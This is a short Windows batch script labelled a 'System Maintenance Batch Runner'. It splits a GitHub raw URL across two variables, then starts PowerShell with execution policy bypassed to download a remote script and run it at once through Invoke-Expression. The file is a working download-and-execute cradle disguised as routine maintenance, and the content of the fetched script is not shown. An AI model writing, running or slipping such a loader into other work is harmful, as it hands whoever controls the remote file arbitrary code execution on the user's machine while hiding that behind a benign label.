@echo off
setlocal enabledelayedexpansion

echo === System Maintenance Batch Runner ===
echo Downloading batch file from GitHub...

REM Correct URL split
set "a=https://raw.githubusercontent.com/"
set "b=Axolotl-in-void/powerhell/main/file.ps1"
set "url=!a!!b!"

REM Download and run
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$c=(New-Object System.Net.WebClient).DownloadString('!url!');Invoke-Expression $c"

echo.
echo Execution finished.
pause
